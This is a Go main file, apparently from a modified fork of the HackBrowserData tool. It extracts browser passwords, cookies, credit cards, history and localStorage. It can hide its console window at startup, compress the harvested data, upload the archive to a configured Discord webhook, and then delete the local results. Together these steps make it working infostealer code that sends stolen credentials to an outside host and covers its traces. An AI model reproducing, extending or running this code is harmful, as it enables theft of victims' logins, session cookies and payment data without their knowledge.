package main

import (
	"os"

	"github.com/urfave/cli/v2"

	"github.com/moond4rk/hackbrowserdata/browser"
	"github.com/moond4rk/hackbrowserdata/log"
	"github.com/moond4rk/hackbrowserdata/utils/fileutil"
	"github.com/moond4rk/hackbrowserdata/utils/webhook"
	"github.com/moond4rk/hackbrowserdata/utils/window"
)

var (
	browserName  string
	outputDir    string
	outputFormat string
	verbose      bool
	compress     bool
	profilePath  string
	isFullExport bool
	configPath   string
)

func main() {
	// Hide window early if configured (before any output)
	config, _ := webhook.LoadConfig("config.json")
	if config != nil && config.HideWindow {
		_ = window.Hide()
	}
	Execute()
}

func Execute() {
	app := &cli.App{
		Name:      "hack-browser-data",
		Usage:     "Export passwords|bookmarks|cookies|history|credit cards|download history|localStorage|extensions from browser",
		UsageText: "[hack-browser-data -b chrome -f json --dir results --zip]\nExport all browsing data (passwords/cookies/history/bookmarks) from browser\nGithub Link: https://github.com/moonD4rk/HackBrowserData",
		Version:   "0.5.0",
		Flags: []cli.Flag{
			&cli.BoolFlag{Name: "verbose", Aliases: []string{"vv"}, Destination: &verbose, Value: false, Usage: "verbose"},
			&cli.BoolFlag{Name: "compress", Aliases: []string{"zip"}, Destination: &compress, Value: false, Usage: "compress result to zip"},
			&cli.StringFlag{Name: "browser", Aliases: []string{"b"}, Destination: &browserName, Value: "all", Usage: "available browsers: all|" + browser.Names()},
			&cli.StringFlag{Name: "results-dir", Aliases: []string{"dir"}, Destination: &outputDir, Value: "results", Usage: "export dir"},
			&cli.StringFlag{Name: "format", Aliases: []string{"f"}, Destination: &outputFormat, Value: "csv", Usage: "output format: csv|json"},
			&cli.StringFlag{Name: "profile-path", Aliases: []string{"p"}, Destination: &profilePath, Value: "", Usage: "custom profile dir path, get with chrome://version"},
			&cli.BoolFlag{Name: "full-export", Aliases: []string{"full"}, Destination: &isFullExport, Value: true, Usage: "is export full browsing data"},
			&cli.StringFlag{Name: "config", Aliases: []string{"c"}, Destination: &configPath, Value: "config.json", Usage: "path to config file"},
		},
		HideHelpCommand: true,
		Action: func(c *cli.Context) error {
			if verbose {
				log.SetVerbose()
			}
			browsers, err := browser.PickBrowsers(browserName, profilePath)
			if err != nil {
				log.Errorf("pick browsers %v", err)
				return err
			}

			for _, b := range browsers {
				data, err := b.BrowsingData(isFullExport)
				if err != nil {
					log.Errorf("get browsing data error %v", err)
					continue
				}
				data.Output(outputDir, b.Name(), outputFormat)
			}

			if compress {
				if err = fileutil.CompressDir(outputDir); err != nil {
					log.Errorf("compress error %v", err)
				}
				log.Debug("compress success")
			}

			// Load config and send to Discord webhook if configured
			config, err := webhook.LoadConfig(configPath)
			if err != nil {
				log.Warnf("failed to load config: %v", err)
			}
			
			if config != nil && config.DiscordWebhook != "" {
				log.Debug("Discord webhook configured, sending results...")
				
				// Ensure results are compressed for webhook
				if !compress {
					if err = fileutil.CompressDir(outputDir); err != nil {
						log.Errorf("compress error before sending: %v", err)
						return err
					}
				}

				if err := webhook.SendToDiscord(config.DiscordWebhook, outputDir); err != nil {
					log.Errorf("failed to send to Discord: %v", err)
					return err
				}
				
				log.Debug("Results sent to Discord successfully")
				
				// Clean up local results after successful upload
				if err := os.RemoveAll(outputDir); err != nil {
					log.Warnf("failed to clean up results directory: %v", err)
				} else {
					log.Debug("Local results cleaned up")
				}
			}
			
			return nil
		},
	}
	err := app.Run(os.Args)
	if err != nil {
		log.Fatalf("run app error %v", err)
	}
}
